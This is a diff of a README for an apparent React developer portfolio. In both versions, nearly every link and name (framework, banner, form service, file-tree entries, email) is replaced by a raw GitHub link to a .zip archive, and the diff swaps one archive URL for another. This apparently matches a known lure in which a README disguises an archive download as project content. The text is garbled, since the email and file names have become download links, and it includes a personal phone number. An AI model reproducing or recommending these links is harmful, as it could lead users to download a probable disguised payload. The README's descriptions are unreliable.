@@ -1,15 +1,15 @@
 # 🚀 Abhinav's Developer Portfolio
 
-A modern, responsive, and interactive portfolio website built with **https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip**. This project showcases Abhinav Singh’s technical skills, projects, and contact information with a clean, animated user experience.
+A modern, responsive, and interactive portfolio website built with **https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip**. This project showcases Abhinav Singh’s technical skills, projects, and contact information with a clean, animated user experience.
 
-![Banner](https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip)
+![Banner](https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip)
 
 ## 📌 Features
 
 - ⚡ Smooth scrolling navigation using `react-anchor-link-smooth-scroll`
 - 📱 Fully responsive layout with mobile navigation menu
 - 🎨 Custom SVG logo of an astronaut coding (transparent and dark-mode ready)
-- ✉️ Contact form integrated with [Web3Forms](https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip) API
+- ✉️ Contact form integrated with [Web3Forms](https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip) API
 - 💻 Sections: Home, About Me, Projects, Work, Contact
 
 ---
@@ -18,7 +18,7 @@ A modern, responsive, and interactive portfolio website built with **https://raw
 
 | Technology | Purpose |
 |------------|---------|
-| `https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip` | Frontend framework |
+| `https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip` | Frontend framework |
 | `CSS`      | Styling and layout |
 | `Web3Forms`| Contact form backend API |
 | `JavaScript` | Logic and interactivity |
@@ -35,15 +35,15 @@ portfolio/
 │ │ ├── Navbar/ # Navbar component
 │ │ ├── Contact/ # Contact form component
 │ │ └── ... # Other UI components
-│ ├── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
-│ └── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
+│ ├── https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip
+│ └── https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip
 ├── .gitignore
-├── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
-└── https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
+├── https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip
+└── https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip
 
 Feel free to reach out via the contact form on the site or through:
 
-📧 Email: https://raw.githubusercontent.com/abhinavv22/portfolio/main/src/assets/portfolio_3.6.zip
+📧 Email: https://github.com/abhinavv22/portfolio/raw/refs/heads/main/src/Components/Contact/Software-1.3.zip
 
 📱 Phone: +91 7525886042
 
